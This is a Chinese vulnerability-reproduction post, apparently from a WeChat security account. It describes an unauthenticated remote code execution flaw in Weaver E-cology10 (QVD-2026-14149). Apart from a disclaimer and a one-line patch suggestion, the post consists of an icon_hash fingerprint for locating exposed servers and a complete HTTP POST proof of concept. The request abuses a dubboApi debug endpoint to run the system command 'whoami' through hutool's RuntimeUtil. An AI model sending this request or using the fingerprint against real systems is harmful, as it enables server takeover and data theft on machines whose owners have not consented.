#  泛微E-cology10存在远程代码执行漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-24 01:58  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何  
直接或者间接的后  
果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# 泛微E-cology10存在远程代码执行漏洞(QVD-2026-14149)  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0OiaWByxmwqqogctia0Kf4puh48OiaLmBD5Pv1dxovlKF53YNFHjibq2wFaNoNich1Y7xps7R1kafLoc3ndZZtzScpq3hlj99bIxzY/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
泛微E-cology10是  
一款面向中大型组织的数智化协同运营平台，定位为企业级数字化中枢，核心覆盖协同办公、流程管理、业务集成、知识管理、低代码开发等全场景能力。  
泛微E-cology10  
存在远程代码执行漏洞，  
攻击者无需认证，可通过向特定接口发送恶意请求，在目标服务器上执行任意代码，完全控制服务器，导致敏感数据泄露或系统沦陷。  
  
04  
  
—  
  
资产测绘  
```
icon_hash="-1619753057"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2RtyPxE1cmSeibfNoiaO4hhNBsJx3QVNunwKM5GRL94Zpc0P032LXRvqib5Ly4H0FQFZ82s9J1D9u9mGTvBXdj7YlNicv7v8tibZibc/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
timeZoneOffset: -480
langType: zh_CN
Content-Length: 12
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

[["whoami"]]
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1iaxLoCmu6E7gBiaBYXC0XiapWqROnlJewQB9BicLs7RnNF49qK2EGfyaicxmTaFqnOiceU6ulNL7UJh67174VHESFicQ6oszUb73DBo/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
  
  
  
